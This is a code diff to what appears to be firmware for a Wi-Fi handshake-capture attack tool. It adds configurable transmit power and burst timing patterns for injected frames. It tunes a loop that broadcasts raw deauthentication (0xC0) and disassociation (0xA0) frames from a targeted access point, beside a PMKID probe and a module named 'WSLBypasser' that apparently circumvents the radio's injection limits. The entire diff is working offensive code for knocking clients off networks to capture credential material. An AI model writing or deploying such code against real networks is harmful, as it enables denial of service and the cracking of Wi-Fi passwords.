@@ -160,6 +160,9 @@ static uint8_t  s_depthHoldSec = 0;    // extra sec hold after pair when hsDepth
 static uint8_t  s_autoStopSec = 0;     // seconds after pair → skip that AP
 static uint32_t s_autoStopAt = 0;      // millis() deadline for auto-skip (0=not armed)
 static uint8_t  s_autoStopBssid[6] = {};
+// PWR / BURST for injected frames (see RadioConfig::txPowerDb/burstPattern).
+static int8_t   s_txPowerDb = 20;      // injected-frame TX power (dBm)
+static uint8_t  s_burstPattern = 1;    // 0=STRAIGHT 1=RANDOM 2=CLUSTER 3=PULSE
 static uint32_t s_methodStartMs = 0;
 static uint16_t s_pairAtSwitch = 0;
 static bool     s_pinOk = false;
@@ -1358,6 +1361,8 @@ static Methods::Ctx buildMethodCtx() {
     ctx.dataAct       = s_dataAct;
     ctx.strictLock    = s_strictLock;
     ctx.depthHoldSec  = s_depthHoldSec;
+    ctx.txPowerDb     = s_txPowerDb;
+    ctx.burstPattern  = s_burstPattern;
     return ctx;
 }
 
@@ -1387,7 +1392,9 @@ static void kickOnThisChannel() {
                 uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
                 for (uint8_t r = 0; r < rounds; r++) {
                     sendRawMgmt(0xC0, s_pinBssid, s_bcast);
+                    delay(WSLBypasser::burstLegGapMs());
                     sendRawMgmt(0xA0, s_pinBssid, s_bcast);
+                    if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
                 }
             }
             if (m.probe && s_pmkidProbe && s_pinSsid[0] &&
@@ -1534,6 +1541,11 @@ static void startCommon(RunMode mode) {
     if (s_autoStopSec > 60) s_autoStopSec = 60;
     s_autoStopAt = 0;  // clear any leftover armed timer
     memset(s_autoStopBssid, 0, sizeof(s_autoStopBssid));
+    s_txPowerDb = Config::radio().txPowerDb;
+    s_burstPattern = Config::radio().burstPattern;
+    // Apply injected-frame TX power + burst shaping once per capture session.
+    WSLBypasser::setTxPowerDb(s_txPowerDb);
+    WSLBypasser::setBurstPattern(s_burstPattern);
     // AUTO starts on table index 0 and rotates via maybeRotateMethod().
     if (s_methodCount == 0) methodTable(); // populate s_methodCount
     // s_hsMethod on-disk layout: 0 = AUTO, 1..N = Methods::name(idx-1).
